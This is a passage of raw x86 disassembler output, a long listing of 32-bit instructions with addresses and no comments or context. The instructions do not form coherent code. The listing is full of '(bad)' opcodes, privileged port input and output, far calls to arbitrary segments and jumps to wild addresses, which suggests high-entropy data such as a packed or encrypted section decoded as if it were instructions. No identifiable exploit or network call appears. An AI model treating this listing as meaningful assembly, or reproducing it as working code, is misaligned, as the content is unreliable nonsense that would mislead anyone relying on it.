  41646d:	fsubr  DWORD PTR [edx-0x4d5a6839]
  416473:	cmp    edi,DWORD PTR [edx-0x3b458daa]
  416479:	inc    ebp
  41647a:	gs loopne 0x41649f
  41647d:	rcl    DWORD PTR [esi-0x80],cl
  416480:	jne    0x41649d
  416482:	push   esi
  416483:	rcl    bh,cl
  416485:	xchg   edi,eax
  416486:	and    eax,0x42f1b76e
  41648b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41648c:	dec    edx
  41648d:	add    al,0x4e
  41648f:	jmp    0x4164ec
  416491:	dec    edi
  416492:	lahf   
  416493:	or     bh,ch
  416495:	mov    edi,0x3d76bc9a
  41649a:	jo     0x4164c8
  41649c:	arpl   bp,si
  41649e:	fidiv  DWORD PTR [edi-0x13]
  4164a1:	mov    bh,0xb2
  4164a3:	or     al,0x65
  4164a5:	xlat   BYTE PTR ds:[ebx]
  4164a6:	leave  
  4164a7:	fcom   DWORD PTR [edi-0x5852a466]
  4164ad:	rcr    edx,cl
  4164af:	daa    
  4164b0:	test   eax,0x32cd1d97
  4164b5:	add    al,0x9c
  4164b7:	dec    edi
  4164b8:	fwait
  4164b9:	(bad)  
  4164ba:	int    0x8c
  4164bc:	cmp    ecx,ebx
  4164be:	neg    DWORD PTR [edi-0x5c]
  4164c1:	jl     0x41645c
  4164c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4164c4:	test   dl,cl
  4164c6:	fidivr WORD PTR [edi-0x46eff281]
  4164cc:	retf   0x5223
  4164cf:	or     eax,0xb4fa6859
  4164d4:	jle    0x4164d2
  4164d6:	mov    es,WORD PTR [edx-0x2a]
  4164d9:	add    DWORD PTR ds:0x31eebacf,0x37f5df4
  4164e3:	mov    ecx,es
  4164e5:	(bad)  
  4164e6:	fdivr  DWORD PTR [eax]
  4164e8:	retf   0xf1dd
  4164eb:	mov    edi,0xc0a381b9
  4164f0:	cmp    al,0xae
  4164f2:	push   0x68
  4164f4:	popa   
  4164f5:	mov    al,0xb5
  4164f7:	mov    al,ds:0xe4427f81
  4164fc:	pop    ss
  4164fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4164fe:	or     DWORD PTR [ecx],edi
  416500:	test   al,0xf1
  416502:	std    
  416503:	repz imul DWORD PTR [ecx-0x69278102]
  41650a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41650b:	ins    DWORD PTR es:[edi],dx
  41650c:	shl    BYTE PTR [ebx],cl
  41650e:	in     eax,0xfc
  416510:	inc    eax
  416511:	dec    eax
  416512:	sub    al,cl
  416514:	loope  0x4164c8
  416516:	lods   eax,DWORD PTR ds:[esi]
  416517:	test   ah,dh
  416519:	push   esp
  41651a:	scas   al,BYTE PTR es:[edi]
  41651b:	mov    esp,0x55764c39
  416520:	jmp    0x54d3533b
  416525:	add    eax,0x325f3bd5
  41652a:	rcl    BYTE PTR [esp+ebp*1],1
  41652d:	cdq    
  41652e:	test   DWORD PTR [ebx+0x27816475],0xb16fd137
  416538:	cli    
  416539:	(bad)  [esi+0x26]
  41653c:	mov    esp,0xb31f7124
  416541:	(bad)  
  416542:	ds inc esi
  416544:	fsubr  DWORD PTR [esi]
  416546:	outs   dx,BYTE PTR ds:[esi]
  416547:	mov    edx,0x37b4bd23
  41654c:	add    cl,ch
  41654e:	or     eax,DWORD PTR [ebx]
  416550:	mov    BYTE PTR [edx],al
  416552:	pusha  
  416553:	les    ecx,FWORD PTR ss:[eax-0x50]
  416557:	push   eax
  416558:	in     eax,dx
  416559:	and    edi,esi
  41655b:	inc    eax
  41655c:	mov    ah,BYTE PTR fs:[ebx-0x65]
  416560:	adc    al,BYTE PTR [edx+ebx*2]
  416563:	xor    al,0xaa
  416565:	leave  
  416566:	scas   al,BYTE PTR es:[edi]
  416567:	add    BYTE PTR [edi-0x2d],bl
  41656a:	sbb    BYTE PTR [ebx-0x154254fb],dh
  416570:	int3   
  416571:	adc    DWORD PTR [eax],0x20
  416574:	mov    ecx,0x37a496d3
  416579:	pop    eax
  41657a:	cs cmp eax,0xdd8dfdfb
  416580:	rol    DWORD PTR [edx+0x4fe742b5],0x66
  416587:	rol    ebp,1
  416589:	pusha  
  41658a:	push   edx
  41658b:	faddp  st(1),st
  41658d:	fnstcw WORD PTR [ebp-0xb1e5b1f]
  416593:	pop    eax
  416594:	into   
  416595:	ds sub eax,0x6a796d16
  41659b:	(bad)  
  41659c:	into   
  41659d:	(bad)  
  41659f:	stc    
  4165a0:	xlat   BYTE PTR ds:[ebx]
  4165a1:	or     esp,DWORD PTR [ebx+edi*2]
  4165a4:	mov    eax,0xdce97074
  4165a9:	mov    dl,0x39
  4165ab:	nop
  4165ac:	jg     0x41653c
  4165ae:	out    0xda,eax
  4165b0:	mov    ch,0x94
  4165b2:	cmp    DWORD PTR [esi+ecx*2+0x5029124c],0xfffffff2
  4165ba:	xchg   esp,eax
  4165bb:	push   ecx
  4165bc:	leave  
  4165bd:	sbb    DWORD PTR [ebp-0x6dcd67d0],eax
  4165c3:	dec    edx
  4165c4:	inc    edi
  4165c5:	popf   
  4165c6:	mov    bl,BYTE PTR [edx]
  4165c8:	pop    esp
  4165c9:	push   eax
  4165ca:	inc    DWORD PTR [edx-0x24356ce7]
  4165d0:	out    dx,eax
  4165d1:	xor    bl,BYTE PTR [esi]
  4165d3:	shl    BYTE PTR [ebp-0x4c],cl
  4165d6:	xchg   edi,eax
  4165d7:	sbb    cl,cl
  4165d9:	mov    ebx,0xa22841b2
  4165de:	dec    esp
  4165df:	sub    al,0x7
  4165e1:	arpl   sp,dx
  4165e3:	(bad)  
  4165e4:	mov    eax,0x3505dddd
  4165e9:	mov    ch,0xb8
  4165eb:	cli    
  4165ec:	mov    esi,0x2dbe5692
  4165f1:	stc    
  4165f2:	lods   eax,DWORD PTR gs:[esi]
  4165f4:	mov    eax,ds:0x838f225b
  4165f9:	sbb    eax,0x76d9053e
  4165fe:	xlat   BYTE PTR ds:[ebx]
  4165ff:	mov    ebx,0xa3fcdf2c
  416604:	adc    al,0x63
  416606:	std    
  416607:	dec    ebx
  416608:	and    dh,BYTE PTR [bx+si-0x9]
  41660c:	mov    cs,WORD PTR [ecx+0x68]
  41660f:	in     eax,0x61
  416611:	out    dx,eax
  416612:	shr    DWORD PTR [esi+0x523234a0],0xf4
  416619:	jp     0x416623
  41661b:	test   ecx,ecx
  41661d:	arpl   si,bx
  41661f:	mov    eax,ds:0x50d20e99
  416624:	sbb    BYTE PTR [edx],cl
  416626:	mov    edx,0x42896ef0
  41662b:	inc    edi
  41662c:	mov    ds:0xe6f8ba01,eax
  416631:	push   eax
  416632:	outs   dx,DWORD PTR ds:[esi]
  416633:	mov    ds:0xe099d0b8,al
  416638:	dec    edi
  416639:	pop    ebx
  41663a:	and    eax,0x4bdc9e9c
  41663f:	fnstcw WORD PTR [edi-0x52]
  416642:	jo     0x416649
  416644:	dec    ebx
  416645:	sar    DWORD PTR [ebx+ecx*8-0x121ff5d0],1
  41664c:	in     eax,0xa6
  41664e:	push   ecx
  41664f:	push   esp
  416650:	xor    BYTE PTR [ebx],al
  416652:	lds    ecx,FWORD PTR [ecx+0x1c55d803]
  416658:	(bad)  
  416659:	xlat   BYTE PTR ds:[ebx]
  41665a:	sti    
  41665b:	sub    al,0xcf
  41665d:	push   ebp
  41665e:	shr    ebp,0x63
  416661:	loope  0x4166d1
  416663:	ss ret 
  416665:	sbb    ecx,esi
  416667:	jb     0x4166ad
  416669:	cmp    DWORD PTR [edi+0x304ccdd2],edi
  41666f:	adc    DWORD PTR [eax+0x39],ecx
  416672:	icebp  
  416673:	bound  ebx,QWORD PTR [eax-0x75]
  416676:	jns    0x41665b
  416678:	sbb    ebp,DWORD PTR ds:0xea552ffa
  41667e:	data16 xor al,0x56
  416681:	loopne 0x416643
  416683:	sub    eax,0xa4b9c9b5
  416688:	xlat   BYTE PTR ds:[ebx]
  416689:	idiv   dl
  41668b:	bnd jmp 0x4166fa
  41668e:	int    0xa7
  416690:	pusha  
  416691:	out    dx,eax
  416692:	cmp    bl,BYTE PTR cs:[esi+0xf]
  416696:	pop    edx
  416697:	sbb    al,0xdb
  416699:	adc    bl,bl
  41669b:	jb     0x4166a6
  41669d:	inc    edx
  41669e:	inc    ebx
  41669f:	jmp    0xcec156f4
  4166a4:	dec    edi
  4166a5:	adc    DWORD PTR [ebp-0x64],0x70b46317
  4166ac:	push   eax
  4166ad:	mov    ebx,DWORD PTR ds:0xf0c8e3f9
  4166b3:	jnp    0x41666b
  4166b5:	mov    ds:0xa19310c3,eax
  4166ba:	int3   
  4166bb:	loopne 0x41664a
  4166bd:	mov    edi,0x467c5f35
  4166c2:	jmp    0xf8eadf99
  4166c7:	bound  ebx,QWORD PTR [esi-0x76]
  4166ca:	or     DWORD PTR [edx+ebp*8-0xd],edi
  4166ce:	mov    bl,0x55
  4166d0:	mov    al,0xee
  4166d2:	lods   eax,DWORD PTR ds:[esi]
  4166d3:	fimul  DWORD PTR [edi+0x2f]
  4166d6:	push   cs
  4166d7:	imul   eax,DWORD PTR [eax],0x2854c7df
  4166dd:	xor    al,0x7
  4166df:	mov    ah,0x8
  4166e1:	sbb    DWORD PTR [ebx-0x75],ebp
  4166e4:	inc    esp
  4166e5:	pop    esi
  4166e6:	(bad)  
  4166e7:	mov    al,0xd
  4166e9:	inc    eax
  4166ea:	mov    edi,0xd94f090a
  4166ef:	mov    esi,0x75b5fa9
  4166f4:	inc    ebp
  4166f5:	push   eax
  4166f6:	xchg   BYTE PTR [edi+0x25c05aa],dl
  4166fc:	push   ebx
  4166fd:	icebp  
  4166fe:	jle    0x41672f
  416700:	cs ret 0xb13
  416704:	push   edx
  416705:	inc    eax
  416706:	xchg   esi,eax
  416707:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416708:	cdq    
  416709:	pop    ebp
  41670a:	mov    BYTE PTR [edi+eax*1+0x5f],dh
  41670e:	and    eax,0x18a4b0cb
  416713:	in     al,dx
  416714:	iret   
  416715:	cld    
  416716:	sub    esp,ebp
  416718:	addr16 mov ch,0x65
  41671b:	hlt    
  41671c:	dec    ebx
  41671d:	cmc    
  41671e:	mov    ah,0xaa
  416720:	jp     0x416711
  416722:	push   ds
  416723:	cmp    al,0x90
  416725:	mov    esp,0xbb8ce2af
  41672a:	fs dec edx
  41672c:	(bad)  
  41672d:	mov    eax,0x2e3db8d0
  416732:	and    ebx,DWORD PTR [ebx]
  416734:	or     eax,0x46572f2e
  416739:	sbb    esp,ecx
  41673b:	stos   DWORD PTR es:[edi],eax
  41673c:	dec    edi
  41673d:	mov    ds:0xfcb342b8,al
  416742:	(bad)  
  416744:	push   cs
  416745:	ins    DWORD PTR es:[edi],dx
  416746:	adc    BYTE PTR [edx+eiz*2],al
  416749:	sbb    BYTE PTR [eax],bl
  41674b:	rcl    DWORD PTR [esi],0xc4
  41674e:	pop    es
  41674f:	cmp    BYTE PTR [edi+0x71dc1a7],dh
  416755:	(bad)  
  416756:	and    eax,0x257e1eb8
  41675b:	xchg   ebp,eax
  41675c:	sub    BYTE PTR [edi+0x16c4b1e7],bh
  416762:	or     edx,DWORD PTR [edx-0x78dc0d55]
  416768:	add    al,0xc4
  41676a:	retf   0xeeb6
  41676d:	lea    esi,[edi]
  41676f:	cs push esi
  416771:	popa   
  416772:	adc    DWORD PTR [edx],ebx
  416774:	popa   
  416775:	cmp    DWORD PTR [ebx-0x7e720980],ecx
  41677b:	mov    ebx,DWORD PTR [edx]
  41677d:	shl    BYTE PTR ds:0x867489bb,cl
  416783:	inc    esp
  416784:	sbb    eax,0xe98671
  416789:	(bad)  
  41678a:	fadd   st,st(3)
  41678c:	lock in al,0x4f
  41678f:	sub    al,0xae
  416791:	fnstenv [edi]
  416793:	jmp    0x416725
  416795:	push   edx
  416796:	inc    edi
  416797:	les    eax,FWORD PTR [eax]
  416799:	js     0x41675d
  41679b:	cmp    dl,bh
  41679d:	pop    ss
  41679e:	enter  0xe605,0x5f
  4167a2:	or     edx,ebx
  4167a4:	add    BYTE PTR [eax-0x4f1dca0d],dl
  4167aa:	fdiv   st,st(1)
  4167ac:	stos   BYTE PTR es:[edi],al
  4167ad:	dec    ebx
  4167ae:	mov    es,WORD PTR [eax-0x7dfac1e]
  4167b4:	data16 daa 
  4167b6:	jo     0x41681b
  4167b8:	jecxz  0x416837
  4167ba:	aam    0xc4
  4167bc:	js     0x416796
  4167be:	sub    cl,ah
  4167c0:	fisubr WORD PTR [ebp-0x7e631ad2]
  4167c6:	xor    DWORD PTR [edi-0xd],0xffffff8a
  4167ca:	dec    esi
  4167cb:	les    ecx,FWORD PTR [edx+0x62]
  4167ce:	push   cs
  4167cf:	xchg   BYTE PTR [eax],al
  4167d1:	inc    ecx
  4167d2:	in     al,dx
  4167d3:	retf   
  4167d4:	dec    esp
  4167d5:	dec    eax
  4167d6:	xchg   edi,eax
  4167d7:	out    0x65,al
  4167d9:	not    ebx
  4167db:	add    dl,BYTE PTR [eax+ecx*1-0x25]
  4167df:	dec    ecx
  4167e0:	(bad)  
  4167e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4167e2:	and    eax,0xfeca5ac8
  4167e7:	or     eax,0xcb0c5e1b
  4167ec:	call   0xad7b:0x7a288373
  4167f3:	sub    BYTE PTR [esi],ah
  4167f5:	inc    esi
  4167f6:	add    BYTE PTR [ebx+0x499f1d82],bh
  4167fc:	jl     0x416797
  4167fe:	enter  0x7cb9,0xb4
  416802:	fwait
  416803:	or     eax,DWORD PTR [ebx]
  416805:	mov    al,0xda
  416807:	push   ds
  416808:	pop    ds
  416809:	pop    ebx
  41680a:	sti    
  41680b:	jb     0x4167d4
  41680d:	mov    bh,0x49
  41680f:	dec    esp
  416810:	jae    0x4167a9
  416812:	inc    edi
  416813:	push   0x5b5ee268
  416818:	fisubr WORD PTR [eax*1-0x4de32dd0]
  41681f:	dec    eax
  416820:	scas   eax,DWORD PTR es:[edi]
  416821:	pushf  
  416822:	aas    
  416823:	or     al,BYTE PTR [edi-0x169cb082]
  416829:	xor    eax,0x21585608
  41682e:	mov    eax,0x2c074f5e
  416833:	push   edx
  416834:	or     bl,BYTE PTR [eax+0x5a]
  416837:	push   0x234dfad3
  41683c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41683d:	xor    bh,BYTE PTR [ecx]
  41683f:	leave  
  416840:	xchg   DWORD PTR ds:[ecx+0x55e02c07],ebp
  416847:	cmc    
  416848:	ret    
  416849:	inc    ah
  41684b:	pop    ebx
  41684c:	fist   DWORD PTR [ecx+0x4]
  41684f:	add    eax,DWORD PTR [edi+esi*1]
  416852:	adc    BYTE PTR [esi],bh
  416854:	inc    edx
  416855:	sti    
  416856:	and    al,0xab
  416858:	fist   DWORD PTR [edi+ebp*1-0x41]
  41685c:	nop
  41685d:	push   0x3e
  41685f:	iret   
  416860:	push   0x7d1370d2
  416865:	leave  
  416866:	inc    ecx
  416867:	or     eax,0x56e5b2e1
  41686c:	jo     0x416842
  41686e:	paddw  mm3,QWORD PTR [edi-0x521fb84e]
  416875:	sbb    DWORD PTR [ebx+edi*4],edx
  416878:	mov    ah,0x38
  41687a:	ss push 0xca72aa3e
  416880:	fwait
  416881:	mov    eax,ebx
  416883:	fwait
  416884:	push   edi
  416885:	test   BYTE PTR [edx-0x723e6a95],al
  41688b:	(bad)  
  41688c:	clc    
  41688d:	shl    BYTE PTR ds:0xf5ff4d85,cl
  416893:	adc    dl,BYTE PTR [ebx-0xe]
  416896:	test   BYTE PTR [edi+ebx*8+0x6b424ea4],ch
  41689d:	mov    ds:0xfddf8ba0,al
  4168a2:	sbb    al,0x56
  4168a4:	outs   dx,BYTE PTR ds:[esi]
  4168a5:	xor    cl,BYTE PTR [ebp+0x27]
  4168a8:	cs js  0x416882
  4168ab:	pop    edx
  4168ac:	inc    esp
  4168ad:	add    eax,0x65d16557
  4168b2:	and    DWORD PTR [edx-0x3b],0xffffffbd
  4168b6:	into   
  4168b7:	out    0x64,eax
  4168b9:	fnstcw WORD PTR [ebx]
  4168bb:	xchg   edx,eax
  4168bc:	inc    ebx
  4168bd:	test   al,0x9c
  4168bf:	and    BYTE PTR [edx],bl
  4168c1:	std    
  4168c2:	or     al,0x11
  4168c4:	lahf   
  4168c5:	es out 0x5b,eax
  4168c8:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  4168ca:	sub    esp,DWORD PTR [ebp+0x4c2f9290]
  4168d0:	mov    bl,0x54
  4168d2:	mov    al,0x11
  4168d4:	hlt    
  4168d5:	jle    0x41689d
  4168d7:	fs and bh,cl
  4168da:	popf   
  4168db:	cs dec ecx
  4168dd:	xor    eax,esp
  4168df:	std    
  4168e0:	adc    al,0xdb
  4168e2:	aaa    
  4168e3:	xchg   ecx,eax
  4168e4:	div    DWORD PTR [esi-0xb]
  4168e7:	jmp    0x57513832
  4168ec:	aaa    
  4168ed:	lds    edi,FWORD PTR [edi+0x22]
  4168f0:	mov    edx,0xf05367b3
  4168f5:	loope  0x416877
  4168f7:	dec    esi
  4168f8:	mov    bh,0xb7
  4168fa:	sbb    ch,BYTE PTR [esi-0x3793caa3]
  416900:	call   0x973f:0x15b5fe54
  416907:	out    dx,eax
  416908:	push   edx
  416909:	fimul  WORD PTR [edx+0x59607d78]
  41690f:	cli    
  416910:	xchg   ebx,eax
  416911:	mov    ah,0x91
  416913:	push   ss
  416914:	mov    BYTE PTR [ecx+0x33f212f6],bh
  41691a:	pop    edi
  41691b:	into   
  41691c:	mov    ebx,DWORD PTR [ebx]
  41691e:	ret    
  41691f:	jecxz  0x416955
  416921:	dec    ecx
  416922:	(bad)  
  416923:	pop    ss
  416924:	cwde   
  416925:	xlat   BYTE PTR ds:[ebx]
  416926:	addr16 xchg ebp,eax
  416928:	pop    esp
  416929:	ins    DWORD PTR es:[edi],dx
  41692a:	jg     0x41698d
  41692c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41692d:	dec    ebp
  41692e:	cmp    esp,esi
  416930:	into   
  416931:	pop    ebx
  416932:	pushf  
  416933:	outs   dx,BYTE PTR ds:[esi]
  416934:	or     ebp,DWORD PTR [edx]
  416936:	out    dx,eax
  416937:	dec    esi
  416938:	mov    DWORD PTR [edx],esi
  41693a:	push   ecx
  41693b:	mov    ?,esp
  41693d:	xlat   BYTE PTR ds:[ebx]
  41693e:	dec    ebp
  41693f:	cli    
  416940:	lds    esi,FWORD PTR [ebp-0x2f]
  416943:	xchg   edi,eax
  416944:	jb     0x416928
  416946:	fcmovne st,st(5)
  416948:	test   DWORD PTR [ecx],ebx
  41694a:	iret   
  41694b:	dec    ebp
  41694c:	cld    
  41694d:	mov    cl,0x1a
  41694f:	xor    DWORD PTR [ecx],ebx
  416951:	or     BYTE PTR [esi-0xd],al
  416954:	sbb    eax,0x4aaba546
  416959:	cmovae ecx,DWORD PTR gs:[esi-0x7ea5026]
  416961:	ficom  WORD PTR [esi+0x60]
  416964:	push   cs
  416965:	int    0xcd
  416967:	dec    edx
  416968:	mov    bl,0xf8
  41696a:	retf   
  41696b:	ins    DWORD PTR es:[edi],dx
  41696c:	daa    
  41696d:	stc    
  41696e:	mov    edx,0x362ad8ef
  416973:	xor    eax,0xa756c7c0
  416978:	pop    ecx
  416979:	mov    edi,0xc79d97a3
  41697e:	repz loop 0x41696d
  416981:	sbb    DWORD PTR [eax],ebp
  416983:	aad    0x87
  416985:	aad    0xc1
  416987:	pop    edi
  416988:	enter  0x844e,0x60
  41698c:	sbb    DWORD PTR [ecx+0xb672f51],edi
  416992:	lahf   
  416993:	rcr    BYTE PTR [ebx+0x7b2e7278],0x71
  41699a:	loopne 0x416955
  41699c:	cmp    edi,DWORD PTR [esp+esi*4]
  41699f:	cdq    
  4169a0:	push   edx
  4169a1:	jge    0x416936
  4169a3:	mul    DWORD PTR [edx+ebp*2+0x65aeaacf]
  4169aa:	mov    fs,WORD PTR [ecx]
  4169ac:	ror    ecx,1
  4169ae:	sbb    BYTE PTR [edx-0x1c],ch
  4169b1:	ja     0x4169e0
  4169b3:	xchg   edx,eax
  4169b4:	cld    
  4169b5:	sub    esp,DWORD PTR [edi]
  4169b7:	test   BYTE PTR [eax],ch
  4169b9:	sahf   
  4169ba:	les    ebx,FWORD PTR [edx]
  4169bc:	aad    0xe4
  4169be:	(bad)  
  4169bf:	out    dx,eax
  4169c0:	imul   ecx,DWORD PTR [ecx+0x140d8b53],0xf
  4169c7:	mov    eax,0xc6abf793
  4169cc:	loopne 0x416994
  4169ce:	or     al,0xb5
  4169d0:	jmp    0x8a615903
  4169d5:	repnz iret 
  4169d7:	(bad)  
  4169d8:	scas   eax,DWORD PTR es:[edi]
  4169d9:	in     eax,0x4a
  4169db:	jae    0x4169aa
  4169dd:	call   0x9222:0xbc1ff00
  4169e4:	pop    ds
  4169e5:	stos   BYTE PTR es:[edi],al
  4169e6:	push   ebp
  4169e7:	test   BYTE PTR [ecx],dh
  4169e9:	inc    esi
  4169ea:	mov    dh,0x6
  4169ec:	scas   eax,DWORD PTR es:[edi]
  4169ed:	je     0x4169ad
  4169ef:	mov    BYTE PTR [edi+0x3fc435bf],dh
  4169f5:	pushf  
  4169f6:	xor    BYTE PTR [ecx],0x97
  4169f9:	push   0x72
  4169fb:	test   ah,cl
  4169fd:	pop    ebp
  4169fe:	mov    dl,0xa2
  416a00:	mov    ah,0xa3
  416a02:	lock stos BYTE PTR es:[edi],al
  416a04:	xchg   esi,eax
  416a05:	dec    eax
  416a06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a07:	xchg   ebp,eax
  416a08:	fs rcr dl,0x89
  416a0c:	leave  
  416a0d:	(bad)  
  416a0e:	jbe    0x416a5f
  416a10:	dec    ebx
  416a11:	xchg   bh,bl
  416a13:	xchg   ebp,eax
  416a14:	popf   
  416a15:	adc    eax,0xa91a8073
  416a1a:	adc    eax,0xdf07b2f0
  416a1f:	retf   
  416a20:	or     dh,al
  416a22:	(bad)
  416a27:	and    eax,0x68d7685c
  416a2c:	xor    DWORD PTR [ebp-0x2c],ebx
  416a2f:	mov    esp,DWORD PTR [edi+eiz*8+0x61]
  416a33:	(bad)  
  416a35:	cwde   
  416a36:	mov    DWORD PTR [edi+eiz*8-0x532c5cc8],esp
  416a3d:	inc    ebp
  416a3e:	pop    esp
  416a3f:	jo     0x416a43
  416a41:	pop    ds
  416a42:	lahf   
  416a43:	rcl    edx,1
  416a45:	sbb    BYTE PTR [edi+edx*4-0xf0a9ff1],0xc9
  416a4d:	test   ebp,edi
  416a4f:	scas   al,BYTE PTR es:[edi]
  416a50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416a51:	or     bl,BYTE PTR [edi]
  416a53:	inc    esp
  416a54:	lahf   
  416a55:	push   ds
  416a56:	sti    
  416a57:	pop    ebx
  416a58:	push   ebp
  416a59:	sbb    BYTE PTR [eax-0x52],cl
  416a5c:	or     al,0xcb
  416a5e:	ds loopne 0x416a72
  416a61:	fucomip st,st(3)
  416a63:	lea    ebx,[ecx-0x2]
  416a66:	outs   dx,BYTE PTR ds:[esi]
  416a67:	jl     0x416a7b
  416a69:	mov    ds:0xbe4d8dcd,al
  416a6e:	scas   al,BYTE PTR es:[edi]
  416a6f:	pop    ecx
  416a70:	lods   eax,DWORD PTR ds:[esi]
  416a71:	rcr    BYTE PTR [ebx-0x6113835b],1
  416a77:	leave  
  416a78:	loop   0x416a9b
  416a7a:	xchg   esi,eax
  416a7b:	pop    esp
  416a7c:	jecxz  0x416afd
  416a7e:	xor    eax,0x78109631
  416a83:	out    0x3a,eax
  416a85:	push   ecx
  416a86:	mov    BYTE PTR [edx],ah
  416a88:	stos   DWORD PTR es:[edi],eax
  416a89:	xor    DWORD PTR [edi],esi
  416a8b:	cwde   
  416a8c:	and    cl,ch
  416a8e:	xchg   edx,eax
  416a8f:	xchg   BYTE PTR [eax-0x68618df6],ch
  416a95:	iret   
  416a96:	aaa    
  416a97:	fnsave [edx+0x330adc28]
  416a9d:	cmp    bh,BYTE PTR [esp+ebp*8-0xa8825a2]
  416aa4:	jns    0x416ab6
  416aa6:	mov    ecx,0x5cf3f00d
  416aab:	or     al,0x1d
  416aad:	mov    ch,0xfc
  416aaf:	lahf   
  416ab0:	dec    eax
  416ab1:	inc    esi
  416ab2:	push   0xffffffda
  416ab4:	xor    eax,0xb3b19185
  416ab9:	ror    BYTE PTR [ebp+0x71fd5a3a],0xb7
  416ac0:	sub    edi,DWORD PTR [edi+0x18]
  416ac3:	pop    esi
  416ac4:	xchg   ecx,eax
  416ac5:	xchg   esp,eax
  416ac6:	aam    0x83
  416ac8:	das    
  416ac9:	xchg   esp,eax
  416aca:	outs   dx,DWORD PTR ds:[esi]
  416acb:	test   DWORD PTR [edi-0x2b],esp
  416ace:	mov    esi,0x4cd41898
  416ad3:	pop    ebp
  416ad4:	inc    esi
  416ad5:	xchg   ecx,eax
  416ad6:	lahf   
  416ad7:	cmp    ch,ah
  416ad9:	mov    edx,0x314df11b
  416ade:	mov    bh,0xcf
  416ae0:	cs jge 0x416af2
  416ae3:	and    esi,DWORD PTR es:[eax+0x20]
  416ae7:	das    
  416ae8:	loope  0x416a75
  416aea:	xor    eax,0x1c861337
  416aef:	xchg   esi,eax
  416af0:	inc    edi
  416af1:	punpckhwd mm1,QWORD PTR [edi]
  416af4:	sub    DWORD PTR [ebp-0xdca274f],ebp
  416afa:	pop    ecx
  416afb:	adc    ebx,DWORD PTR [esp+esi*2]
  416afe:	sbb    dl,ah
  416b00:	ins    DWORD PTR es:[edi],dx
  416b01:	push   ebp
  416b02:	(bad)
  416b05:	mov    ah,0xa5
  416b07:	fs (bad) 
  416b09:	cdq    
  416b0a:	xchg   edi,eax
  416b0b:	test   DWORD PTR [eax-0x44237f7d],eax
  416b11:	add    eax,0x9116939
  416b16:	cli    
  416b17:	pop    ecx
  416b18:	push   ds
  416b19:	and    al,BYTE PTR [edi]
  416b1b:	xchg   esp,eax
  416b1c:	cwde   
  416b1d:	sub    eax,0x88c55989
  416b22:	aad    0x1e
  416b24:	call   0xd14a:0xcc9cfeba
  416b2b:	mov    WORD PTR [edx],fs
  416b2d:	inc    esp
  416b2e:	jl     0x416ac7
  416b30:	jp     0x416b6d
  416b32:	mov    es,WORD PTR [ebp+0x767310a0]
  416b38:	pop    eax
  416b39:	inc    ebp
  416b3a:	aam    0x68
  416b3c:	das    
  416b3d:	mov    WORD PTR [ebp+esi*8-0x22],ds
  416b41:	rcr    bh,cl
  416b43:	fst    DWORD PTR [esi]
  416b45:	repz cmp al,0x27
  416b48:	xchg   DWORD PTR [ecx],eax
  416b4a:	pop    eax
  416b4b:	into   
  416b4c:	call   0xb1da8512
  416b51:	jne    0x416b2d
  416b53:	(bad)  
  416b54:	adc    eax,0x9e74dccb
  416b59:	mov    edx,0xa79b4c91
  416b5e:	push   0x59
  416b60:	push   ebx
  416b61:	pop    ecx
  416b62:	sub    ebp,esp
  416b64:	adc    eax,0x6bf7e542
  416b69:	ds push cs
  416b6b:	fwait
  416b6c:	push   cs
  416b6d:	pop    edx
  416b6e:	fsub   QWORD PTR [eax+eax*2]
  416b71:	call   0x94873dec
  416b76:	mov    ebx,DWORD PTR [ebp-0x508e5ae1]
  416b7c:	xor    eax,0x5816b6fb
  416b81:	push   0x4274c20
  416b86:	mov    WORD PTR [eax],cs
  416b88:	jns    0x416b6e
  416b8a:	gs inc esp
  416b8c:	pop    edi
  416b8d:	or     al,0x80
  416b8f:	call   0x46bf:0xec1dd813
  416b96:	fmul   DWORD PTR [ebx]
  416b98:	test   DWORD PTR [ebx],ecx
  416b9a:	adc    al,0xe4
  416b9c:	fsub   DWORD PTR [edi-0x19d63944]
  416ba2:	enter  0xaced,0xe6
  416ba6:	rcr    DWORD PTR [ebp+edx*8+0x39992dd3],1
  416bad:	add    eax,0xaa2792f
  416bb2:	inc    edx
  416bb3:	mov    ah,0x9b
  416bb5:	cmp    edx,DWORD PTR [ebx+0x3b]
  416bb8:	outs   dx,DWORD PTR ds:[esi]
  416bb9:	xchg   esp,ecx
  416bbb:	pusha  
  416bbc:	pop    edx
  416bbd:	and    BYTE PTR [edx+ebp*8+0x37308155],ah
  416bc4:	int3   
  416bc5:	inc    eax
  416bc6:	neg    DWORD PTR [edi-0x4763e309]
  416bcc:	out    0x37,al
  416bce:	dec    esi
  416bcf:	xor    eax,0xdb370db3
  416bd4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416bd5:	cmp    eax,0x2ac0b9d0
  416bda:	sub    al,0x6e
  416bdc:	jae    0x416ba7
  416bde:	adc    dh,dh
  416be0:	push   ebx
  416be1:	push   edi
  416be2:	std    
  416be3:	dec    ebp
  416be4:	test   al,0x15
  416be6:	adc    edi,ebx
  416be8:	cmp    ah,BYTE PTR [esi+0x68]
  416beb:	mov    ah,0x44
  416bed:	mul    BYTE PTR [esi-0x23e2f53d]
  416bf3:	mov    cl,0xae
  416bf5:	mov    dl,0xb9
  416bf7:	sbb    al,0xd0
  416bf9:	or     BYTE PTR [edx],al
  416bfb:	call   0x85397857
  416c00:	mov    eax,ds:0x7496f1b0
  416c05:	dec    ebx
  416c06:	js     0x416bf6
  416c08:	jecxz  0x416c5e
  416c0a:	shl    DWORD PTR [ecx+eiz*8-0x632e754],1
  416c11:	fwait
  416c12:	pop    eax
  416c13:	mov    ah,0x8c
  416c15:	in     eax,0x7
  416c17:	xor    bh,BYTE PTR [esi+0x6e289908]
  416c1d:	xchg   esi,eax
  416c1e:	cmp    eax,0xb4d5431a
  416c23:	daa    
  416c24:	in     eax,0x80
  416c26:	clc    
  416c27:	ins    DWORD PTR es:[edi],dx
  416c28:	leave  
  416c29:	ss mov bl,0xaa
